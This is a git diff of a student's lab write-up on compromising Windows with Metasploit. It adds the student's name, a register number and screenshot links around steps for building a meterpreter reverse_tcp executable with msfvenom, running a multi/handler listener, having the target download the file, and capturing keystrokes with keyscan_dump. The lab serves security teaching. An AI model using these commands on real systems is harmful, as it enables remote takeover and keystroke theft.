@@ -3,7 +3,8 @@ Compromising windows using Metasploit
 # Metasploit
 Compromising windows using Metasploit
 
-### Developed By
+### Developed By- Sanchita Sandeep
+### Register number: 212224240142
 
 # AIM:
 
@@ -62,12 +63,22 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
+<img width="502" height="218" alt="image" src="https://github.com/user-attachments/assets/542716ec-f7f4-4627-b8f7-c2db05845e18" />
+
+
 
 
 
 Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
 
 ### Output:
+<img width="629" height="111" alt="image" src="https://github.com/user-attachments/assets/cbf7b67d-94db-41b6-96ea-accc115a080d" />
+
+
+
+
+
+
 
 
 
@@ -89,9 +100,22 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
+<img width="523" height="462" alt="image" src="https://github.com/user-attachments/assets/cb1612c9-8677-401b-aa01-4fa0676f55e9" />
+
+<img width="680" height="155" alt="image" src="https://github.com/user-attachments/assets/99ce0211-fdc8-4f54-82a4-92fef4bc76a5" />
+
+<img width="514" height="437" alt="image" src="https://github.com/user-attachments/assets/c0d4abe1-4ff6-4081-aa54-7c61de2ec4b0" />
+
+
+
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
+
+<img width="561" height="623" alt="image" src="https://github.com/user-attachments/assets/10a0196d-0530-4683-bcdb-e9c868945b11" />
+
+
+
 
 
 
@@ -112,6 +136,8 @@ The target is now owned. Following are meterpreter commands for key capturing in
 
 
 keyscan_dump Shows the keystrokes captured so far
+<img width="898" height="238" alt="image" src="https://github.com/user-attachments/assets/c0e0b1c2-1abc-4d8e-81e8-d7bb2657c56a" />
+
 
 
 
